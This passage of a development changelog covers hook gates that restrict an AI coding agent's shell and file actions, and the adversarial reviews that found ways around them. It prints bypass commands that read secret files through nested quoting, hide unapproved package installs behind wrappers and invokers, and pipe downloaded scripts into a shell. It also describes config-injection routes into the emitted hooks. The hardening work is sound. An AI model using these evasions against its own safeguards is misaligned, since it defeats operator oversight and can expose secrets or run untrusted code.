measured a forced re-apply deleting an operator's `permissions.allow`, their
own `Bash(rm:*)` deny rule, `model`, `env` and `statusLine` with **no backup
anywhere** — `find` for `*.bak`/`*~`/`*.orig`/`*backup*` returned nothing. The
remedy for one kind of data loss was another kind.

Before overwriting a file the installer did not author, `--force` now copies
it to `.claude/.installer-backups/<run-timestamp>/<original path>` and names
the location in its output.

Three properties that matter more than the copy itself:

* **It only fires when something is actually lost.** The predicate is the same
  one the skip branch uses — untracked, digest-drifted, or stickily skipped —
  now extracted as `_is_operator_content()` and shared by both, so the two can
  no longer disagree about what "operator content" means. A `--force` that
  merely rewrites our own untouched bytes writes no backup and prints nothing
  about backups. A signal that fires every time is not a signal.
* **`--dry-run` previews it and writes nothing.**
* **`--uninstall` never touches the backups.** They are the operator's
  recovery material, not an installer artifact, so they are deliberately not
  manifest-tracked.

### One decision left open

`.claude/.installer-backups/` is **not** in the emitted `.claude/.gitignore`.
Adding the line is correct and is one line — but `.claude/.gitignore` is in
the plan, so it moves every golden digest in every fixture and triggers the
`GOLDEN_UPDATE=1` re-baseline plus a freeze exception. That is a release
ritual, not a drive-by, so it is left for whoever next re-baselines. Until
then the directory name is deliberately conspicuous and every run that creates
one prints its path.

**Blast radius.** `apply_plan` only; no emission changed, goldens unmoved.
20 suites, **1703 → 1724 checks**, 0 failed. Mutation-tested: disabling the
backup fails 7 checks, backing up unconditionally fails 1, and writing the
backup during `--dry-run` fails 1.

## 2.6.0 in-version fix — settings.json is co-owned, not skipped (2026-07-29)

The fix the previous entry's detector was built for. `.claude/settings.json`
now gets the treatment the co-owned project-root `.gitignore` already had —
merged by key instead of overwritten or skipped wholesale.

**Ownership is per-ENTRY, not per-key.** Owning the `hooks` key outright was
the obvious implementation and it is wrong: it silently deletes an operator's
own hook registration, which is the same class of harm this change exists to
remove, just relocated. So:

| | owner | mechanism |
|---|---|---|
| `$schema`, `_generatedBy`, `_note_mcp` | installer | set or removed outright |
| `hooks` | **shared** | our entries identified by `command`; theirs untouched, merged into the matching matcher group |
| `permissions.deny` | **shared** | union; a deny rule is strictly restrictive, so contributing one can never fail open |
| everything else | operator | preserved byte-for-byte |

`owned_hooks` / `owned_deny` in the manifest record what each install
contributed, so a later run can retire ours without touching theirs — that is
what lets a shrinking `never_read_paths` actually shrink, and a hook dropped
from the plan actually de-register.

**`--uninstall` reverses it properly:** our registrations and deny rules are
stripped and the operator's file is handed back; the file is removed only when
nothing of theirs remains. Leaving our `hooks` key behind would have pointed
Claude Code at scripts the same run had just deleted.

### Two defects found while building this, both caught by tests before landing

1. **Owning `hooks` wholesale destroyed an operator's own hook.** Found by
   executing the case rather than reasoning about it; fixed by moving to
   per-entry ownership.
2. **The wholesale write path did not record `owned_hooks`.** So the FIRST
   merge after one had no record of which registrations were ours, and a hook
   dropped from the plan stayed registered forever while the same run deleted
   the file it named — the exact `rc=127` dangling reference this was meant to
   fix, reintroduced one layer down. Now recorded on every write path.

### What this dissolves

The dangling-registration defect is gone at the root: registration and removal
now happen in the same pass, so they cannot disagree. `--force` remains the
escape hatch for a file too broken to merge (unparseable JSON, a non-object
`permissions` or `hooks`, an event whose value is not a list) — those are
declined with a reason rather than guessed at, and the previous entry's
`EXIT_UNENFORCED` still fires for them.

**Blast radius.** A fresh install is byte-identical to before (the merge path
is only reached when a file already exists), so the golden freeze surface does
not move. 20 suites, **1652 → 1703 checks**, 0 failed; corpus unchanged at
HOLD 275 · LIVE 0 · OPEN 4 · REGRESSION 0 · SKIP 3; sweep 0 of 17,268.
Mutation-tested: owning `hooks` wholesale, overwriting `deny` instead of
unioning, dropping `owned_hooks` from the wholesale write, and disabling the
uninstall strip each fail 1–5 checks.

## 2.6.0 in-version fix — post-install enforcement verification (2026-07-29)

**The installer could report a fully successful install that enforced
nothing.** Round-5 review, executing rather than reading: installing into a
project that already carried a `.claude/settings.json` wrote all 11 hook
scripts, registered **none** of them, and exited 0 with an empty stderr and a
single `SKIP` line on stdout line 29 of 60. `settings.json` is the only
registration site for the shell substrate, so every gate went dead at once —
while the hook bodies stayed on disk and still exited 2 when invoked by hand,
so hand-verification passed and the operator had no signal at all. Measured
base rate on the author's own machine: 4 of 14 project directories carry that
file. `mode: retrofit` — the mode aimed at existing projects — behaved
identically.

The installer already had the fact it needed. `_hook_tier(action)` returns
`security-critical` for exactly that action, and the manifest already recorded
it:

```json
{"path": ".claude/settings.json", "state": "skipped-local-edit",
 "tier": "security-critical"}
```

Nothing ever read it back.

### What landed

Two independent signals, both on **stderr**, both non-zero:

| signal | catches |
|---|---|
| `summary["skipped_security"]` | any security-critical path this run DECLINED to write — including a pre-placed stub at a hook path, which the wiring check structurally cannot see because the hook is registered and present |
| `verify_wiring(root, plan)` | emitted-but-unregistered (the dead-suite case) **and** registered-but-absent (a re-apply drops a hook from the plan and deletes it while a skipped `settings.json` keeps pointing at it — the harness then runs a missing script, `rc=127`, on every matching call, and 127 is neither allow nor block) |

New exit code **`EXIT_UNENFORCED = 3`**: files were written, but this install
does not enforce. Deliberately distinct from 2 (config refused, nothing
written) because the operator's next move differs, and 0 is now reserved for an
install whose enforcement was *verified*.

`verify_wiring` is written as a **property**, not as a check for the two known
causes: it holds whatever the reason a registration is missing, including
reasons that do not exist yet. Given that six consecutive fix commits on this
branch shipped a defect into the class they were fixing, a detector that
generalises was worth more than two special cases.

### What this deliberately does NOT do

It does not change the skip semantics. `settings.json` is genuinely co-owned —
the operator owns `permissions`/`model`/`env`/`statusLine`, the installer owns
`hooks` — and the right fix is the managed-merge treatment `_apply_root_gitignore`
already gives the co-owned root `.gitignore`. That is a behaviour change; this
is its detector, and it lands first on purpose. Until it does, `--force`
remains the only remedy and still replaces the whole file with no backup.

### Blast radius

`apply_plan`/`main` only — **no emission changed**, so the golden freeze
surface (`build_plan` body digests) does not move. Verified: 19 suites,
**1618 → 1652 checks**, 0 failed; regression corpus unchanged at HOLD 275 ·
LIVE 0 · OPEN 4 · REGRESSION 0 · SKIP 3. Both new signals were
mutation-tested — neutering `verify_wiring` fails 14 checks, removing the tier
recording fails 3 — so neither can green vacuously.

`plugin/commands/bootstrap-apply.md` gained a step: check the exit code before
reporting, because its step 5 previously told the agent to report the
stdout counts, which look like success in exactly this case.

## 2.6.0 in-version fix — round-4 review remediation (2026-07-29)

**Six consecutive fix commits had shipped a defect into the class they were
fixing, every one on a fully green suite.** This is the seventh attempt, and
the first thing it did was stop trusting the suite: a 282-row regression
corpus, run before a line was changed, showed **77 live defects at `b1782ec`
while 1516 checks passed**. A green suite has never once carried information
in this repository.

**SCOPE: greenfield.** `mode: retrofit` was explicitly out of scope (owner
decision, 2026-07-29). D14 — the retrofit legacy allowlist being inert on the
absolute paths the harness actually sends — is **not fixed**; it is recorded
as backlog **K-1** with the structural reason it has now recurred across three
rounds: `mode: retrofit` has no golden fixture and zero rows in the substrate
differential, so it is untested by construction. `tests/test_retrofit.py`
(263 checks) was treated as a tripwire and stayed green.

### The design problem underneath most of it

There were **six hand-rolled encodings of "where does a command begin, and
what is its command word", and five distinct prefix-membership sets** — four
of them claiming in comments to be "kept in sync" with the others.

| implementation | file | consumed by |
|---|---|---|
| `_cs_isinv` | `lib/templates.py` (shared header) | dependency-gate, test-gate, spec-gate-commit, ci-mirror, eval-gate |
| `CMD_PFX` | `lib/templates.py` (anchor regex) | the same five |
| `_sg_push` | `lib/templates.py` (secrets-gate body) | secrets-gate |
| `_CS_INVOKERS` | `lib/templates.py` | **nothing — dead code, already drifted** |
| `_segment_candidates` / `_expand_invoker_args` | `lib/sdk_gates_template.py` | all SDK gates |
| `_CMD_PREFIXES` / `_CMD_PFX_RE` | `lib/sdk_gates_template.py` | all SDK gates |

`_CMD_PFX_RE` sat byte-identical to the previous commit while its shell twin
grew, under a comment reading *"Shell parity: this is CMD_PFX from the shell
header, same alternation in the same order."* Twelve spellings diverged.

All of it now derives from **`lib/cmdpos.py`**, one definition per set, and
`tests/test_composition.py` asserts that each set literal appears exactly once
outside comments — because "the number of implementations went down" is
gameable, and merging two walkers while leaving both anchor regexes untouched
would have left D3 and D9 exactly where they were.

**The two kinds of consumer needed OPPOSITE treatments**, and getting this
backwards was the single most expensive mistake available. A reviewer applied
exact flag arity to the walkers and measured **16 of 27 real wrapper-flag
spellings regressing from deny to allow** — mostly LONG forms (`sudo
--chroot /`, `nice --adjustment 5`, `flock --timeout 10`) of flags whose short
form was in the table — with every suite green.

- **Walkers** lost their bound entirely. It was `< 3` in one and `< 4` in
  another, and `timeout -k 1 -s KILL 5 sh -c` needs five. Once a wrapper word
  is seen, skip to the end of the segment; the gate on *having seen a wrapper*
  is the safety argument, so `grep -r sh file` never starts the skip.
- **Anchor regexes** gained positionals. They UNDER-consumed, which is the
  fail-open direction: `sudo -u root pip install evilpkg` was rc=0 on **both
  substrates at all three commits**, invisible to a differential (they agreed)
  and to a parent-vs-head sweep (it never changed). Unbounded consumption
  cannot fail open in a regex, because matching asks whether a parse EXISTS —
  `sudo -i pip install evil` backtracks and matches, while `echo -n pip
  install evil` does not, since `echo` is not a wrapper.

### Fixed

- **Wrapper operands hid the invoker behind them** (D1/D2/D7). `timeout 5 sh
  -c 'true; pip install evilpkg'` and eleven sibling wrappers were `shell=allow
  / sdk=deny` — the direction `sdk_gates_template`'s own binding rule forbids.
  Fixed by bringing the SHELL up, never by bringing the SDK down.
- **The SDK's verb gates never expanded an invoker at all** (D1, SDK half).
  `_git_verb` did not call `_expand_invoker_args`; only `_scan_install_line`
  did. So `sh -c 'git commit -m x'`, `bash -c`, `zsh -c`, `eval`, `busybox sh
  -c` and `ssh box` were allowed on **test-gate, spec-gate-commit and
  eval-gate simultaneously**. Repairing only what D1's shell cause named would
  have left every one of them open.
- **`sudo -u root pip install evilpkg`** and twelve more wrapper-with-operand
  shapes (D9), on both substrates.
- **Neither substrate's quote scanner handled backslash escapes** (D5). This
  is D5's real root cause; an earlier diagnosis blamed recursion depth, a
  reviewer implemented depth-3 recursion over mis-parsed input, and two of
  D5's three reproductions still allowed. `bash -c "sh -c \"pip install
  evil\""` desynced the scanner; `sh -c pip\ install\ evil` had no quoted run
  to recurse into at all. Both now deny, on both substrates, and both EXECUTE
  without the fix.
- **Nested quotes inside an invoker argument were a FAIL-OPEN** (D8), in the
  gate this codebase repeatedly calls the one with no override path:

  ```
  bash -c "cat secrets/prod.yaml"      rc=2
  bash -c "cat 'secrets/prod.yaml'"    rc=0   <- read the file
  sh   -c "cat '.env'"                 rc=0
  eval    "cat '.env'"                 rc=0
  ```

  One extra pair of quotes. The re-tokenization was a whitespace split, not a
  parse. The SDK had **two** independent expansion mechanisms and the obvious
  fix touches only the one dependency-gate uses; both now share one head scan.
  Backlog **J-15 recorded this inverted**, as an over-match "in the cheap
  direction" — its own example allowed.
- **The SDK split lines before tracking quotes** (D6), so an unbalanced quote
  earlier in a command hid everything after it.
- **eval-gate diverged in BOTH directions** (D4). Each substrate had a range
  the other lacked: the shell had the root-commit `ls-tree` branch and no
  `@{u}..HEAD`; the SDK had `@{u}..HEAD` and no root-commit branch, so on a
  shallow clone (`actions/checkout` defaults to `--depth 1`) it saw an empty
  diff and ALLOWED. Both carry all three ranges now, and the SDK's
  `prompt|\.md$` predicate is narrowed to the shell's. Backlog J-18 closed.
- **The emitted `gates.py` no longer compiled clean** (D10). A bare `\S` in a
  docstring: under `-W error::SyntaxWarning` the import raises and **every SDK
  gate is disabled at once**. Nothing compiled the emitted artifact, so the
  golden digest simply re-baselined over it. Now asserted twice — in-process
  and via a real `py_compile -W error` on the file as it lands on disk.
- **CONFIG INJECTION IS A CLASS, not one field** (D12). Four sinks reach
  executable shell, established by planting a marker in every string field and
  searching the emitted plan: `secrets.never_read_paths` and `deps.approved`
  reach quoted heredocs whose sentinel they can forge (terminating it makes
  every later entry top-level shell **executed on every hook invocation**, and
  silently TRUNCATES the guarded list); `hooks.drift_*` is interpolated
  unquoted into `[ "$n" -ge <value> ]` on every PostToolUse event — the P0-1
  arithmetic-injection RCE re-entering through config; `commands.*` with an
  unbalanced quote emits a hook bash cannot parse, so every commit is refused
  with a syntax error and no diagnosis. All validate at `resolve_config`.
  Backlog J-17's "privilege-equivalent rather than escalation" framing is what
  made `open` look defensible for three rounds.
- **CONFIG-SHAPED VACUITY** (D18) — the largest untouched surface, and no
  technique the round-4 brief endorses can see it, because both substrates
  agree, it reproduces at every commit, and a composition sweep varies COMMAND
  shape while this varies CONFIG shape. Each of these installed rc=0, silent,
  and produced a secrets-gate that guarded **nothing**:

  ```
  never_read_paths: ["**/secrets/**", "**/.env*"]   root-level .env ALLOW
  never_read_paths: ["./secrets/**", "./.env*"]     fully vacuous
  never_read_paths: ["secrets/"]                    fully vacuous
  never_read_paths: ["secrets"]                     fully vacuous  (not in
                                                    the brief; the most
                                                    natural spelling of all)
  ```

  Normalized rather than rejected — `**/secrets/**` is not a wrong thing to
  write, and a gate an operator is fighting is a gate an operator deletes. The
  DEFAULT list passes through byte-identical, so no fixture moves.
- **Six advisory hooks exited 2 on an empty payload** (D17), not four as
  backlog J-19 recorded: `spec-gate-entry` is a **UserPromptSubmit** hook,
  where `exit 2` blocks the user's own prompt. The posture is now baked into
  the shared header at emission time, DERIVED from the body's own
  `FAIL_CLOSED=0`, so there is no second list to drift.
- **`tdd-gate` was near-vacuous** (D11). Case-sensitive `find` globs, so
  `PaymentTest.java` / `OrderSpec.scala` / `Foo.test.ts` — the default
  conventions in the exact ecosystems the round-3 fix cited — did not match
  while the SDK lowercased and did. It pruned only `.git`, so
  `node_modules/p/dist/test_zzz.js` satisfied `src/zzz.py`, and on a pristine
  install `.claude/commands/spec-new.md` satisfied `src/new.py`. **The SDK's
  prune test used the ABSOLUTE path**, so any project living under a directory
  named `.git` had this gate disabled entirely — found by running the fix.
- **`Grep{glob}` was inspected by NEITHER substrate** (D19), and that call
  returns matching file CONTENTS. Lens A's F6 finding re-entering through a
  sibling parameter of two that had already been fixed. Every parameter of
  every gated tool is now enumerated and decided explicitly, including the
  ones deliberately NOT matched (`content`, `old_string`, `new_string`) and
  the one escalated instead (`WebFetch{url}`, backlog K-5).
- **The arrival-channel patterns were a hand-written subset** of sets that
  already existed (D16/D20). `curl url | /bin/sh`, `| tee /tmp/x | sh`,
  `| sudo -u root sh`, `| env sh`, `| timeout 5 sh`, `| nohup sh`, plus
  `aria2c`/`http`/`fetch` as downloaders — all allowed. Now built from
  `cmdpos`. Added `yarn create`, `npm init <pkg>`, `pnpm create`, `bun create`,
  `bun x`, `pipx run`, `uv tool run`; `deno run <url>` and `uv run --with
  <pkg>` are matched by their DISTINGUISHING token so `deno run main.ts` and
  `uv run python` stay allowed. **Download-then-run** (`curl url > /tmp/a.sh
  && sh /tmp/a.sh`) now denies via a two-half structural rule — backlog J-10
  declined this on the premise that it needed a generic `bash <path>` block,
  which is not what closing it takes.
- **`secrets-gate` cost** (D15): per-pattern derivation was being recomputed
  inside the (candidate x pattern) loop. Hoisted, plus candidate
  de-duplication: 15.15 -> 5.43 ms/line with a 202-pattern config, moving the
  60 s fail-CLOSED `PreToolUse` crossover from ~4,000 to ~11,000 lines on this
  machine. The quote-heavy single-huge-command shape the gate's own comment
  warns about was measured for the first time and is ~3x CHEAPER per unit. The
  gate is still LINEAR — recorded as backlog **K-3**, bounded rather than
  closed. `_GATE_TIMEOUTS` now declares the same 60 s bound the shell emits.
- **`deps.md` told operators something false** (D13): *"The dependency gate
  stops blocking once the package appears above."* Untrue for an index
  override, a requirements file, a remote script or a run-without-installing
  channel. The emitted doc now lists what the approved list does not cover.

### Newly ALLOWED — enumerated before the work started

`docs/round-4-intended-relaxations.md` was written **before any parser was
touched**, because the definition of done as originally worded blocked its own
sequencing: fixing D4 necessarily newly-allows a docs-only push, and fixing
D11 necessarily newly-allows source writes.

| | |
|---|---|
| R-1 | eval-gate: a documentation-only `git push` (SDK: deny -> allow) |
| R-2 | tdd-gate: a source file whose test exists under a conventional name (shell: deny -> allow) |
| R-3 | `script pip install evil`, `su pip install evil` — **neither runs its positional operand** (shell: deny -> allow) |
| R-4 | the six advisory hooks stop blocking on an empty payload |
| R-4b | `ssh h "git commit -m '.env'"` now DENIES — D8's price, and exactly the over-match J-15 originally recorded as accepted |

Anything newly allowed that is not on that list is a regression, and the list
was closed before measurement.

### The technique, committed

`tests/composition_sweep.py` — `wrapper x wrapper-FLAG x operand x invoker x
quoting x separator x verb`, **at gate level, on both substrates**. Payload-
content fuzzing returned nothing across three rounds; composition found
fifteen divergences in one pass. Backlog **J-20** proposed a differential
against `bash` word-splitting instead; that would NOT have caught D1 or D2,
because both tokenizers agree with bash about word-splitting and disagree
about command POSITION, which is downstream of it.

Two axes are new and each is load-bearing: a **wrapper-FLAG axis in short AND
long spellings** (without it the sweep cannot see the arity class at all), and
a **backslash-escape axis** (`sh -c pip\ install\ evil` has no quoted run, so
every quoting axis built from `'` and `"` is blind to it).

Results, re-runnable:

```
tests/composition_sweep.py                          17,268 x 2 substrates
                                                    0 not denied
tests/composition_sweep.py --rev 0fba4d2 --rev b1782ec
                                                    0 newly allowed outside
                                                    R-1..R-4
regression-invariant-corpus.py    LIVE 77 -> 2,  REGRESSION 0
suite                             1516 -> 1617 checks, 0 failed
tests/test_retrofit.py            263, unchanged (tripwire)
```

`tests/test_composition.py` runs a bounded, evenly-spaced sample every commit
— evenly spaced and never "the first N", because the first N cases are all one
wrapper, which is how a sampled sweep misses this class.

### Corrections to the record

Five consecutive newly-allowed inventories in `test_greenfield_golden.py` were
written from intent and all five were wrong. **Freeze-exception 24** claimed
its inventory came "from an executed parent-vs-head sweep and not from intent";
a 22,392-invocation sweep found **1,740 shapes that `0fba4d2` blocks and
`b1782ec` allows**, none of them among its three listed items — and **1,164 of
those came from the round-2 series `fac2897..ff435f5`**, appearing in no
freeze-exception, changelog entry or backlog row, including exception 23, which
makes the identical claim. Both are corrected in place.

**Exceptions 22, 23 and 24 all claim "thirteen emitted files / all twelve
hooks".** No fixture emits twelve hooks. Measured: `default` 11,
`design_steering` 11, `full_autonomous` 15.

Backlog rows rewritten from executed evidence rather than edited: **J-15**
(inverted), **J-1** (describes neither substrate — SURFACED for an owner call,
not retired), **I-11** (stale in the safe direction), **J-17** (framing),
**J-19** (undercount), **J-10** (premise), **J-18**, **J-20** (superseded).
New section **K** records what this round did not close: K-1 retrofit/D14,
K-2 `ci-mirror` has no SDK twin so every "substrate parity" claim is scoped to
7 of 11 gates, K-3 the secrets-gate bound, K-4 the now-empty defect ledger,
K-5 `WebFetch{url}`.

**NO PROTOCOL_VERSION BUMP** — 2.6.0 is still unreleased.

## 2.6.0 in-version fix — round-3 review, and its remediation (2026-07-29)

**Five consecutive fix commits have now introduced a defect into the class
they were fixing.** The round-2 remediation (`fac2897`, `9952741`, `edac7c7`,
`ff435f5`) fixed eighteen findings and shipped at least four new defects of
its own, on a green suite of 1494 checks. Three independent adversarial
lenses — run blind of each other, ~22,000 verdict evaluations between them —
returned 25 findings against it.

**This entry exists because the previous four commits had none.** Lens C
looked for the changelog record of that batch and found nineteen added lines,
all backlog rows and one correction bullet: every new denial it shipped was
undocumented. Freeze-exceptions 21 and 22 existed only as comments inside a
test file while the changelog's numbered series stopped at 20.

### What the previous batch got wrong, in its own terms

- **A fail-open, from a justification that was false.** Retiring backlog J-7
  made a quoted separator non-splitting, reasoning that *"hiding an install
  inside quotes does not run it."* True for `git commit -m "fix; npm install
  evil"`. False for `sh -c 'true; pip install evil'`, which runs — confirmed
  by execution with a fake `pip` on PATH. The invoker rule had been added to
  `secrets-gate` in the same batch and not to `cmd_segments`, so the two
  segmenters disagreed in the dangerous direction.
- **A second fail-open at the intersection of its own two headline fixes.**
  The invoker re-tokenization used `read -ra`, which is line-oriented, so a
  multi-line invoker argument was truncated at the first newline. The corpus
  had no row combining an invoker with a newline.
- **F-435 was not actually closed.** `cmd_segments` walked quoted runs and
  then split on every newline — including ones inside quoted runs, because
  the segment break was itself spelled with a newline. So the `;` half was
  fixed and the `\n` half left open, while `secrets-gate`'s twin fix
  deliberately carried quote state across newlines: two parsers, opposite
  answers about one character, in the batch that claimed to have consolidated
  them.
- **An unsatisfiable gate.** `tdd-gate` required a test *newer* than the
  target, and `-newer` needs the target to exist — so creating any new source
  file was refused after the operator had already written the test. Its only
  escape was `touch` through Bash: the gate's sole recourse was routing
  around the gate. This had been latent forever and became live when the
  absolute-path fix made the gate actually run.
- **Every CI push blocked.** `eval-gate`'s `*.md` predicate treated every
  markdown file as a prompt file. Harmless on a two-commit diff, fatal once
  the root-commit branch fed it the whole tree: a shallow clone (the
  `actions/checkout` default) has no `HEAD~1`, took that branch, matched
  `README.md`, and refused the push.
- **A block that caught the honest spelling and missed the hostile one.** The
  index-flag deny list matched `--index-url URL` and missed `--index-url=URL`
  and `-f URL`. Enumerating flag *names* is what left the hole.
- **A refusal the operator could not act on.** "A bare version needs a dot"
  refused `pip install --timeout 60 requests` with *"not in deps.md approved
  list: 60"* — instructing the operator to add the integer 60 to their
  dependency policy. That is the same unactionable-advice failure the
  previous batch had just fixed elsewhere.
- **A quality mechanism that could not fail.** The known-defect ledger was
  shipped with every row fixed, so `ledger()` had zero call sites,
  `LEDGER_OPEN` was structurally 0, and its count-pin compared 0 to 0.
  Deleting the whole mechanism left the suite green. A device whose premise
  is *"a test that cannot fail is worthless"* shipped in exactly that state,
  described in its commit message as a standing guard.

### Fixed

All of the above. The segmenter now uses a non-newline segment break and a
non-space sentinel for whitespace inside quoted runs, so a quoted value stays
one token and quotes no longer hide a tool name; an invoker's quoted argument
is re-segmented on both substrates; index overrides are decided on the VALUE
carrying a scheme rather than on a list of flag names; a bare integer is read
as a flag value after an unambiguous long flag and as a package name after a
one-letter flag; `tdd-gate` requires a matching test to EXIST, found anywhere
in the tree; `eval-gate` fires on paths that name a prompt; wrapper binaries
that carry their own operand (`timeout 5 sh -c`, `flock f sh -c`) no longer
hide the invoker behind them. The ledger is armed again with a defect round 3
found and this batch did not fix.

### Recorded and NOT fixed

`docs/deferred-backlog.md` — J-15, J-16, and the pre-existing items round 3
surfaced: a `never_read_paths` entry can terminate the emitted heredoc and
inject shell into the hook (present at every commit in this chain, unrecorded
until now); `eval-gate`'s two substrates diff different ranges (`HEAD~1` vs
`@{u}..HEAD`); the empty-payload refusal exits 2 from hooks that declare
themselves advisory, because the check sits above `FAIL_CLOSED=0` in the
shared header.

### The standing gap

No test compares `cmd_segments` / `_sg_scan` against real `bash`
word-splitting. Every one of the five rounds has shipped a tokenizer defect,
and each round's clean result came from a hand-built corpus written by the
person who wrote the code. A generative differential against a real shell is
the only mechanism any of the three lenses could name that would catch the
class.

## 2.6.0 in-version fix — round-2 review of the fix batch (2026-07-29)

**Three consecutive fix commits have now introduced a defect into the class
they were fixing.** `0ec72d0` introduced F1/F2/F5 while fixing the upstream
report. `4cc9742` shipped a stronger laundering primitive than the bug it
replaced. And the batch below (`311bd67`) shipped a **fail-open** and a
**false positive** of its own. Every one of them landed on a fully green
suite.

This round was not planned. Three independent lenses were run at the
*handoff prompt* for the next review, before it was handed off; two of them
went past the prompt to the commit and found the defects. The lesson worth
keeping is the one that generalises: **a rule verified against one witness is
verified against one witness.** The commit message for `311bd67` asserted that
a short flag "can never swallow a package name" on the strength of a single
example, and that assertion was false for four real registry packages.

### Fixed — two of these were live fail-opens

- **`dependency-gate` FAIL-OPEN.** The value-shaped-flag inversion — *"a flag
  consumes the following token only if that token is value-shaped"* — counted
  `[0-9]*` and `*=*` as value-shaped. So after any of ~60 flags, a package
  name that merely **starts with a digit** or carries a **version pin** was
  swallowed and installed unapproved:
  `npm install -f 7zip-bin`, `npm install -p 0x`, `npm i -w 2to3`,
  `pip install -f evil==1.0`, `pip install -i evil>=2` — all `rc=0`, all real
  registry packages, on **both** substrates. Value-shape is now a URL, a
  `:spec:`, a path, a `key=value` carrying **no** version-comparison
  operator, or a bare digits-and-dots version. `==`, `>=`, `<=`, `~=` and
  `!=` are pip's own package syntax and are tested first, before the
  `key=value` arm they all contain.
- **`secrets-gate` FALSE POSITIVE — lens B finding 4's failure mode,
  reintroduced by its own fix.** The lens A F6 repair (a bare directory name
  should match its own `dir/**` pattern) was applied to every candidate, so
  **any token equal to a never-read directory stem blocked**:
  `grep secrets README.md`, `git commit -m secrets`, `echo secrets` all
  `rc=2` — in the one gate with no override path, which is precisely the
  pressure the previous round documented. The arm is now scoped to
  **structured path parameters** (`file_path`, `notebook_path`, `path`,
  `pattern`), where a bare directory name is unambiguously a path; a bare
  word in a shell command is not. F6's finding as executed —
  `Grep{"path":"secrets"}` returning file contents — stays fixed.
- **SDK fail-open on an unbalanced quote.** `shlex.split` raises, and the
  fallback split kept the quote glued to the token, so
  `cat "secrets/prod.yaml` was **allowed** on the SDK while the shell blocked
  it — in the fallback whose own comment promises *"a parse failure must not
  become an allow"*. It now also emits the quote-stripped form.
- **SDK reason strings violated seam §3.3.** `_scan_install_line` folded its
  three non-package refusals into the package-**name** string, so a
  package-index override, a piped remote script and an unverifiable
  requirements file all denied with *"not in deps.md approved list:
  `<package-index-override>`"* and advised the operator to add that literal
  to `deps.md` — advice that cannot work, for a refusal that has nothing to
  do with the approved list. Each now carries the shell's own explanation.
- **`secrets-gate` had no timeout.** It was the only `PreToolUse` gate
  without one, while being the one that runs on every `Bash` call *and* every
  file tool, and its pure-bash tokenizer is superlinear in command length
  (measured on the emitted hook: 0.29 s / 1.38 s / **6.01 s** at 100 / 500 /
  2000 lines). Now 60 s. A `PreToolUse` timeout fails closed at the seam's
  runtime floor, so this bounds the hot path in the safe direction.
- **`RETROFIT.md` cost-log twin.** `:112`, `:1132` and `:1166` still named
  the `cost log` / `cost.jsonl` artifact after P3 renamed it
  `session-events.jsonl`. The same commit that fixed *"P1-1 surviving in the
  retrofit twin"* left P3's twin standing.

### Newly allowed, and why — `docs/deferred-backlog.md` J-14

Scoping the bare-directory arm to structured parameters means the **bare
stem** is allowed again on the Bash surface: `cd secrets; cat prod.yaml` and
`tar cf /tmp/s.tar secrets` were blocked at `311bd67` and are not now. That is
a real loss, stated here rather than deleted from the invariant matrix.

The judgement: nothing in a token stream distinguishes the path in
`cd secrets` from the prose in `git commit -m secrets`, because the gate does
not track argument position — deliberately. So the choice is which error to
pay. The over-match is paid on ordinary work in **every session**; the
under-match is paid only against an agent already moving a directory
wholesale, which has routes the deny-list never covered anyway (`cp -r
secrets /tmp/x`, then read the copy). A tripwire that fires on prose gets
deleted; a tripwire with a known gap stays installed. Anything naming a path
*under* the directory still blocks, which is what keeps the relaxation narrow.

### Testing

Every defect above is pinned as a regression case on both substrates, and two
structural gaps in the round-1 suite are closed:

- `tests/test_substrate_differential.py` compared **verdicts only**, so it
  structurally could not see the reason-string divergence. It now asserts the
  reason for each of `dependency-gate`'s three non-package refusals against
  both substrates — the seam §3.3 obligation had no test at all.
- Its corpus had **no unbalanced-quote case**, which is why the SDK fail-open
  passed it. Added, along with the digit-initial and version-pinned package
  names that defeated the value-flag inversion.
- `tests/test_sdk_gates.py`'s requirements-file check asserted the literal
  `requirements-file` appeared *anywhere in the deny dict* — which it did, as
  the sentinel. It passed on a reason that named a sentinel as a package.

Suite 1400 → **1441 checks across 17 suites**, 0 failed.

**Golden re-baseline: freeze-exception no. 20.** Exactly four emitted files
move, identically on all three fixtures: `dependency-gate.sh`,
`secrets-gate.sh`, `sdk_gates/gates.py`, `settings.json`. Action counts
unchanged at 57/69/59, zero added, zero removed, zero frozen twins moved
(verified by a body diff against `311bd67`). `settings.json` moves on all
three this time — unlike no. 19, where it moved on `full_autonomous` only —
because the new `secrets-gate` timeout is unconditional while the eval-marker
denies were archetype-gated. No `PROTOCOL_VERSION` bump: same reasoning as
no. 18 and no. 19, and 2.6.0 is still unreleased.

## 2.6.0 in-version fix — two-lens adversarial-review batch (2026-07-28)

Sources: `docs/lens-a-execution-findings-2026-07-28.md` (F1–F10, execution:
scratch install, payloads piped into the emitted hooks, exit codes read) and
`docs/lens-b-execution-findings-2026-07-28.md` (findings 1–15, spec
conformance and regression). Two independent adversarial reviews of v2.6.0,
run blind of each other. Both baselined against a **fully green suite** — the
third consecutive release where that was true while the defects below were
live.

**The version decision, stated rather than inherited.** No `PROTOCOL_VERSION`
bump. This batch changes whether gates block in **both** directions, which is
past the bar the upstream report sets for a version decision — but 2.6.0 is
**unreleased**: the only tag in the repo is `v2.5.0` (2026-07-27, an ancestor
of HEAD). The defects never shipped under a version number, so they are fixed
in place rather than bumped past. A bump is owed when 2.6.x is actually
tagged. The previous entry inherited this reasoning silently; it is restated
here because the premise ("unreleased") is the whole argument and stops being
true the moment someone tags.

**Seam §8.4 trigger walk** (the one change that could plausibly fire is the
SDK matcher-table addition):

| §8.4 trigger | Fires? | Evidence |
|---|---|---|
| New CLI entry point / contract-level flag (§3.2) | No | No CLI surface touched. |
| Field added/changed in the result-parsing table (§4.1) | No | Deny **shape** unchanged; reason strings are §4.3 relay, not §4.1 pins. |
| Event added/changed in the stream-event table (§5) | No | No stream event touched. |
| Shared sentinel names/locations/scope (§7.4) | No | No sentinel carrier moved — re-confirmed by a frozen-twin body diff, 42/44 artifacts, 0 moved. |
| Security-critical hook set **membership** (§7.2) | No | §7.2 membership is keyed on gate **name**. All names unchanged; `secrets-gate` gains a second *matcher*, not a second identity. |
| Provenance markers / synthesize contract (§7.3) | No | Untouched. |
| `binds` compatibility set (§8.1a) | No | `SEAM-CONTRACT-v2-0-0.md` not modified except a §3.3 prose correction. |

§8.4's closing line governs the remainder: *"changes that touch only gate
internals or dispatch policy do not bump `seam_version`."* `seam_version`
stays 2.0.0. §3.3's Coverage prose **was** stale (it described the pre-P0-2
matchers) and is corrected in place, per the seam's own DR-03
heading/prose-staleness precedent.

### Removed, and newly blocked

